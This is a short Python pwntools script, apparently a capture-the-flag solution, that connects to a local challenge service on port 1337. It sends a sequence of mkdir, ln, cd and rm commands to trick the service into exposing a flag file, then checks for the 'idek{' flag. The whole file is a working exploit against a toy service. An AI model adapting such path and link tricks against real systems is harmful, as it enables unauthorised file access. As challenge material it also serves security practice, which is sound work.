#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

p = pwnlib.tubes.remote.remote('127.0.0.1', 1337)


p.sendline(b"mkdir flag.txt")
p.sendline(b"mkdir flag.txt/b")
p.sendline(b"ln flag.txt a")
p.sendline(b"cd a/b")
p.sendline(b"rm /a")
p.sendline(b"cd ..")
p.sendline(b"rm /flag.txt/b")
p.sendline(b"rm /flag.txt")
p.sendline(b"create_flag")
p.sendline(b"cat $PWD")
assert b'idek{' in p.recvuntil(b'\n')
p.sendline(b"exit")
p.close()

exit(0)
